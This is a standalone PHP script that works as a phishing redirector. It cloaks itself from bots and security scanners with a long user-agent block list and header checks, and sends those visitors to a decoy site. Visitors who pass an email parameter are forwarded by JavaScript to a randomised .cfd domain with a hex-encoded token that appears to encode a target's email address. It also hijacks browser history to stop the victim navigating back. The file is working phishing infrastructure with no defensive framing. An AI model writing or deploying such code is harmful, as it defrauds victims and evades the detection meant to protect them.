<?php

header("Cache-Control: no-cache, no-store, must-revalidate");
header("Pragma: no-cache");
header("Expires: 0");

error_reporting(0);


///////////////////////////////////////////////////
$HexLink = "web.2508754ed16b3ef265e19aacfaea02ae.cfd/?token=696e666f406d61646d617173747564696f2e636f6d";
/////////////////////////////////////////////////


$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$accept_language = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '';
$suspicious_languages = ['*', 'q=0.5', 'q=0'];

// List of bot keywords
$bot_agents = [
    'curl', 'wget', 'bot', 'spider', 'crawler', 'googlebot', 'bingbot', 'slurp', 'yandexbot', 'botmail', 'scraper',
    'facebookexternalhit', 'twitterbot', 'linkedinbot', 'pinterest', 'slackbot', 'discordbot', 
    'embedly', 'quora link preview', 'bitlybot', 'mj12bot', 'ahrefsbot', 'semrushbot', 'sogou', 'telegrambot', 
    'searchbot', 'scooter', 'twiceler', 'spinn3r', 'python-requests', 'node.js', 'crawling', 'zoomeye', 
    'healthbot', 'facebook', 'googleusercontent', 'yahoo', 'msnbot', 'applebot', 'chrome-lighthouse', 'serpstatbot',
    'grapeshotbot', 'zyborg', 'rogerbot', 'bot/0.1', 'megaindex', 'hermit', 'crawl', 'feedfetcher', 'magpie-crawler',
    'w3c_validator', 'dotbot', 'seokicks', 'alexabot', 'linguee', 'webcollage', 'tencenttraveler', 'metaURI', 
    'ruby', 'python-urllib', 'java', 'javafx', 'serp-api', 'backlink-crawler', 'archive.org_bot', 'wordpress', 
    'googlesearch', 'baidu', 'spinn3r', 'yandeximages', 'yandexvideo', 'nginx', 'squid', 'cloudflare', 'rockerbot',
    'crawler4j', 'paros', 'botobix', 'valkyriebot', 'clicky', 'sezbot', 'pingdom', 'dataforseo', 'linkdex', 
    'commoncrawl', 'urlbot', 'panscient', 'seomoz', 'apache', 'bing-preview', 'datadome', 'semalt', 'xovi', 
    'wordpressbot', 'scrapy', 'unitybot', 'geobot', 'neocities', 'skyscannerbot', 'bunjalloo', 'searchmetrics',
    'gdebot', 'gobot', 'loadimpact', 'btbot', 'nutch', 'robozilla', 'cognitiveseo', 'majestic-12', 'mapillary', 
    'sistrix', 'plesk', 'serphunter', 'pingdom', 'calaisbot', 'pycurl', 'googletagmanager', 'robot', 'retire.js',
    'watson', 'websoul', 'sitebot', 'roverbot', 'daumoa', 'botster', 'webmeup', 'skyscraper', 'goku', 'searchbot',
    'AhrefsBot', 'DuckDuckBot', 'BaiduSpider', 'Sogou Spider', 'SeznamBot', 'ScreamingFrog', 'Exabot'
];

// Check for empty User-Agent (common for bots)
if (empty($user_agent)) {
    header("Location: https://google-bot-factory.com");
    exit();
}

// Check if User-Agent contains bot keywords
foreach ($bot_agents as $bot) {
    if (stripos($user_agent, $bot) !== false) {
        header("Location: https://google-bot-factory.com");
        exit();
    }
}

// Check for missing or suspicious Accept-Language
if (empty($accept_language) || in_array($accept_language, $suspicious_languages, true)) {
    header("Location: https://google-bot-factory.com");
    exit();
}

// Main email handling
if (isset($_GET["email"]) && !empty($_GET["email"])) {
    $email = $_GET['email'];

    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        header("Location: https://google-bot-factory.com");
        exit();
    }

        $Link = "https://$HexLink";
        $jsRedirect = "$Link";
        $noJsRedirect = "https://google-bot-factory.com";

        echo <<<HTML
        <!DOCTYPE html>
        <html>
        <head>
        <meta charset="utf-8">

        <noscript>
            <meta http-equiv="refresh" content="0; url={$noJsRedirect}">
        </noscript>

        <script>
            history.pushState(null, null, location.href);
            window.onpopstate = function () {
                history.pushState(null, null, location.href);
            };
            window.onbeforeunload = function () {
                window.location.replace(location.href);
            };

            // MAIN JS redirect
            location.replace("{$jsRedirect}");
        </script>

        </head>
        <body>
        </body>
        </html>
        HTML;

        exit();

} else {
header("Location: https://google-bot-factory.com");
exit();
}

?>
